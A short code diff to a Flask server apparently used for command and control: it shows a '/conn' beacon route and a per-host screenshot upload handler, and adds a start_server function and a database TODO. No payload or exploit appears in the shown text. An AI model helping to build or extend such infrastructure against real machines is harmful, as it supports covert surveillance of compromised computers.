@@ -14,6 +14,16 @@ app.config['UPLOAD_FOLDER'] = 'uploads/'
 app.config['ALLOWED_EXTENSIONS'] = {'png', 'jpg'}
 
 
+def start_server(ip, port):
+    """
+    start the server
+    :param ip: interface to host on
+    :param port: port to host on
+    :return: None
+    """
+    app.run(host=ip, port=port)
+
+
 @app.route("/conn")
 @app.route("/conn/")
 def beacon_handler():
@@ -42,7 +52,7 @@ def screenshot_handler(host):
             file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
 
             # update database and return success
-
+            # TODO: UPDATE DATABASE
             return "success"
 
         # fail if file type not allowed
